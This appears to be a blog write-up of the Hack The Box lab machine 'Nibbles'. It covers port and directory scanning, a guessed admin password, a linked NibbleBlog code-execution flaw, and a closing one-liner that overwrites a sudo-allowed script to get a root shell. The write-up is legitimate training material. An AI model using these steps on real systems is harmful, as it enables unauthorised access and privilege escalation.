---
layout: post
title: "HTB Writeup - Nibbles"
date: 2019-11-18 12:59:50 +0000
---

# HTB writeup - Nibbles
<br />
Let's start with nmap:
```
└──╼ #nmap -sC -sV 10.10.10.75
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-18 11:34 CET
Nmap scan report for 10.10.10.75
Host is up (0.073s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.95 seconds
```
<br />
As we can see, we have ssh and http. Let's head to:

http://nibbles.htb
<img src="/assets/nibbles1.PNG" alt="drawing" width="600"/>
<img src="/assets/nibbles2.PNG" alt="drawing" width="600"/>
<br />
Let's list the directories:

└──╼ #gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.75/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/18 11:44:16 Starting gobuster
===============================================================
/content (Status: 301)
/themes (Status: 301)
/admin (Status: 301)
/plugins (Status: 301)
/languages (Status: 301)
===============================================================
2019/11/18 11:51:33 Finished
===============================================================

└──╼ #dirb http://10.10.10.75/nibbleblog/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Nov 18 11:57:45 2019
URL_BASE: http://10.10.10.75/nibbleblog/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.75/nibbleblog/ ----
==> DIRECTORY: http://10.10.10.75/nibbleblog/admin/                                             
+ http://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401)    
```
<br />
The most interesting page is http://10.10.10.75/nibbleblog/admin.php

Doing some guessing with usernames found in the directories, the credentials are admin:nibbles. 
<br />
<img src="/assets/nibbles3.PNG" alt="drawing" width="600"/>

I found a [vulnerability]([https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html]) affecting this version of nibbleblog. 

And we got access to the machine as nibbler!
<br />
Once I collected the user flag, I did some enumeration:
```
$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
I went to "/home/nibbler/personal/stuff/monitor.sh", and I found THE script that does some monitoring of the system. Since nibbles can run that script without providing password, I issued this command: 
```
echo "#!/bin/sh\nbash" > monitor.sh & sudo ./monitor.sh
```
and I owned the machine!
